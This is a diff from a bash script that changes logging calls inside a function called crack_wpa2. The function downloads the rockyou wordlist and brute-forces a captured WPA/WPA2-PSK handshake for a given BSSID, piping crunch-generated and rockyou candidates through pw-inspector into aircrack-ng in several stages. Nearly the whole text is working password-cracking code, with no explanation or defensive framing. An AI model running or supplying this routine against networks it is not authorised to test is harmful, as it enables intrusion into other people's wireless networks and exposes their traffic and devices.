@@ -34,19 +34,19 @@ function crack_wpa2 ()
 	local _bssid="$2"
 	test ! -f ~/rockyou.txt && wget -c https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz
 	tar -xf rockyou.txt.tar.gz
-	msg "Cracking WPA/WPA2-PSK...." 0
+	echo "Cracking WPA/WPA2-PSK...."
 	crunch 8 8 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	crunch 12 12 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 2" 0
+	echo "Section: 2"
 	cat rockyou.txt| pw-inspector -m 8 -M 16 |shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 3" 0
+	echo "Section: 3"
 	crunch 8 8 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 4" 0
+	echo "Section: 4"
 	crunch 8 8 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 5" 0
+	echo "Section: 5"
 	crunch 12 12 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 6" 0
+	echo "Section: 6"
 	crunch 12 12 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 7 - Completed." 0
-	msg "WPA/WPA2-PSK brute force completed."
+	echo "Section: 7 - Completed."
+	echo "WPA/WPA2-PSK brute force completed."
 }
